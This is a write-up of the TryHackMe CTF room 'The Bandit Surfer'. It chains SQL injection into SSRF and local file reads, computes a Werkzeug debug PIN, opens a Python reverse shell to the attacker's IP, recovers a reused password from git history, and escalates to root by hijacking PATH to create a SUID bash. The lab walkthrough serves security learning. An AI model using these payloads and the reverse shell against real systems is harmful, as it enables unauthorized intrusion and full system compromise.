# TryHackMe - The Bandit Surfer

> *These notes were written with AI assistance for English clarity. Attack paths and commands reflect my own work on the room.*

**Difficulty:** Hard  
**Category:** SQLi, SSRF, Werkzeug PIN, PATH hijacking  
**Room:** [The Bandit Surfer](https://tryhackme.com/room/surfingyetiiscomingtotown)  
**Access:** Hidden QR code in AoC Day 20 (Git repo / calendar PNG)

## Introduction

Advent of Cyber '23 — Side Quest 4 (finale). A Flask application vulnerable to SQL injection that doubles as SSRF, leading to Werkzeug console RCE, then privilege escalation via git history and PATH hijacking on `[`.

**Objectives:**
- Obtain `user.txt` as `mcskidy`
- Escalate to root and read `root.txt` + `yetikey4.txt`

---

## Reconnaissance

### Nmap

```bash
nmap -sS -p- <TARGET_IP>
```

Primary service: **port 8000** — Flask app serving three elf SVG images.

Each image links to:

```
http://<TARGET_IP>:8000/download?id=1
```

Testing `id='` triggers a **500 error with Flask debugger** — Werkzeug debug mode is enabled. The `/console` endpoint exists but requires a PIN.

The `id` parameter and debug console immediately suggest **SQLi → SSRF → PIN crack → RCE**.

---

## Enumeration

### SQL injection discovery

The error reveals string formatting in the query:

```python
query = "SELECT url FROM elves WHERE url_id = '%s'" % (file_id)
```

UNION injection controls the returned URL:

```
/download?id=1' AND 1=0 UNION ALL SELECT 'http://127.0.0.1:8000/test' WHERE ''='
```

The backend uses **pycurl** to fetch that URL — combining **SQLi with SSRF**.

### LFI via file://

```bash
/download?id=1' AND 1=0 UNION ALL SELECT 'file:///etc/passwd' WHERE ''='
/download?id=1' AND 1=0 UNION ALL SELECT 'file:///home/mcskidy/app/app.py' WHERE ''='
```

Confirms:
- Flask user: **mcskidy**
- Flask path: `/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py`

Files needed for PIN cracking:

```
file:///etc/machine-id
file:///sys/class/net/eth0/address
file:///proc/self/cgroup
```

---

## Exploitation

### Initial access — Werkzeug PIN crack

The Flask debug PIN is a SHA1 hash of public + private machine bits.

Reference script (adapt MAC and machine-id to **your** instance):

```python
import hashlib
from itertools import chain

probably_public_bits = [
    "mcskidy",
    "flask.app",
    "Flask",
    "/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py",
]

private_bits = [
    str(0x024BAA220669),              # MAC eth0 decimal — YOUR VALUE
    b"<your-machine-id>",             # from /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")
h.update(b"pinsalt")
num = f"{int(h.hexdigest(), 16):09d}"[:9]
print("-".join(num[x:x+3] for x in range(0, 9, 3)))
```

Open `http://<TARGET_IP>:8000/console`, enter PIN.

#### Shell via console

Reverse shell in the Python debugger:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<YOUR_IP>",9001))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
import pty; pty.spawn("sh")
```

Or inject your SSH public key into `/home/mcskidy/.ssh/authorized_keys`.

```bash
ssh mcskidy@<TARGET_IP>
cat ~/user.txt
```

---

## Privilege Escalation

### mcskidy password from Git history

```bash
cd ~/app
git log
git show HEAD~2
```

An older commit contains a MySQL password in `app.py` — reused as the **system password** for `mcskidy`.

```bash
sudo -l
# Enter recovered password
```

Output:

```
User mcskidy may run the following commands on proddb:
    (root) /usr/bin/bash /opt/check.sh

secure_path=/home/mcskidy:/usr/local/sbin:...
```

`/home/mcskidy` first in `secure_path` enables **PATH hijacking**.

### Analyzing /opt/check.sh

```bash
#!/bin/bash
. /opt/.bashrc
cd /home/mcskidy/
response=$(/usr/bin/curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8000)
if [ "$response" == "200" ]; then
  /usr/bin/echo "Website is running..."
else
  /usr/bin/echo "Website is not running..."
fi
```

`/opt/.bashrc` starts with:

```bash
enable -n [    # disables the `[` builtin
case $- in *i*) ;; *) return;; esac
```

The script is **non-interactive** → `.bashrc` returns immediately — but `enable -n [` still runs. The `[` in the `if` test is no longer a builtin; bash resolves it via **PATH**.

All other commands use absolute paths (`/usr/bin/curl`, `/usr/bin/echo`) — only `[` is vulnerable.

### PATH hijacking

```bash
cd /home/mcskidy
cat > '[' << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash
chmod 6777 /tmp/bash
chown root:root /tmp/bash
EOF
chmod +x '['

export PATH=/home/mcskidy:$PATH
sudo /usr/bin/bash /opt/check.sh
```

Then:

```bash
/tmp/bash -p
cat /root/root.txt
cat /root/yetikey4.txt
```

---

## Dead ends to avoid

- Injecting into curl's HTTP response code — curl only accepts 3-digit codes
- Exploiting `dircolors` in `.bashrc` — non-interactive scripts skip most of it except `enable -n [`
- Cracking current MySQL hash — password lives in an **old git commit**

---

## Flags

| Flag | How to obtain |
|------|---------------|
| user.txt | Werkzeug console → shell as mcskidy |
| root.txt | PATH hijack on `[` via sudo check script |
| yetikey4.txt | `/root/yetikey4.txt` after root |

*Values intentionally omitted. Complete the room on [TryHackMe](https://tryhackme.com/room/surfingyetiiscomingtotown).*

---

## Conclusion

### What I learned

| Technique | Detail |
|-----------|--------|
| SQLi → SSRF | UNION SELECT a URL → pycurl fetches it |
| file:// LFI | Read local files through curl |
| Werkzeug PIN | machine-id + MAC + username + flask path |
| Git forensics | `git show HEAD~N` recovers forgotten secrets |
| PATH hijacking | `enable -n [` + custom secure_path + unqualified `[` |

The final AoC 2023 side quest ties web exploitation to a subtle Linux privesc — disabling a single builtin can be enough when PATH order is attacker-controlled.
